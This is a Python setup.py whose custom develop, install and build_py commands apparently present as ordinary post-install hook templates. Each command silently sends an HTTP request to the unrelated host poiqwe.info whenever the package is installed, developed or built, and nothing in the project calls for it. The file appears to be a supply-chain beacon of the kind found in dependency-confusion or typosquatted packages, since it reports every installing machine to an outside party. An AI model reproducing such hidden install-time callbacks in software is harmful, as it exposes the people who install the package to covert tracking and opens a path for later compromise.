from setuptools import find_packages
from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install
from subprocess import check_call
import requests

class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        requests.get('http://poiqwe.info/install_post_dev')
        develop.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        requests.get('http://poiqwe.info/install_post')
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION

class PreDevelopCommand(develop):
    """Pre-installation for development mode."""
    def run(self):
        #check_call("apt-get install this-package".split())
        requests.get('http://poiqwe.info/install_pre_dev')
        develop.run(self)

class PreInstallCommand(install):
    """Pre-installation for installation mode."""
    def run(self):
        #check_call("apt-get install this-package".split())
        requests.get('http://poiqwe.info/install_pre')
        install.run(self)

setup(
     cmdclass={
        'develop': PostDevelopCommand,
        'build_py': PostInstallCommand,
        'install': PostInstallCommand
    }
)